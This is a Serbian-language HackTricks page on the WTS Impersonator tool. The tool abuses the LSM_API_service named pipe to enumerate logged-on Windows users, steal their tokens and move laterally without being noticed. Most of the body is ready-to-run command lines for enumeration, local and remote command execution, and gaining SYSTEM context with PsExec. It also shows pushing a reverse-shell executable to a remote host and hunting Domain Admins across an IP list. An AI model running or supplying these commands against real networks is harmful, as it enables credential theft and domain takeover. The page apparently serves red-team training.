<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Alat **WTS Impersonator** iskorišćava **"\\pipe\LSM_API_service"** RPC Imenovane cijevi da tajno nabroji prijavljene korisnike i preuzme njihove tokene, zaobilazeći tradicionalne tehnike impersonacije tokena. Ovaj pristup olakšava neprimetno lateralno kretanje unutar mreža. Inovacija iza ove tehnike pripada **Omri Baso-u, čiji rad je dostupan na [GitHub-u](https://github.com/OmriBaso/WTSImpersonator)**.

### Osnovna funkcionalnost
Alat funkcioniše kroz niz API poziva:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ključni moduli i upotreba
- **Nabrajanje korisnika**: Alat omogućava lokalno i udaljeno nabrajanje korisnika, koristeći odgovarajuće komande za svaki scenario:
- Lokalno:
```powershell
.\WTSImpersonator.exe -m enum
```
- Udaljeno, navođenjem IP adrese ili imena hosta:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Izvršavanje komandi**: Moduli `exec` i `exec-remote` zahtevaju **Service** kontekst za funkcionisanje. Lokalno izvršavanje jednostavno zahteva izvršnu datoteku WTSImpersonator i komandu:
- Primer za lokalno izvršavanje komande:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe se može koristiti za dobijanje Service konteksta:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Udaljeno izvršavanje komandi**: Uključuje kreiranje i instaliranje servisa na daljinu, slično kao PsExec.exe, omogućavajući izvršavanje sa odgovarajućim dozvolama.
- Primer udaljenog izvršavanja:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modul za pronalaženje korisnika**: Cilja određene korisnike na više mašina, izvršavajući kod pod njihovim akreditivima. Ovo je posebno korisno za ciljanje Domain Admins sa lokalnim administratorskim pravima na više sistema.
- Primer upotrebe:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
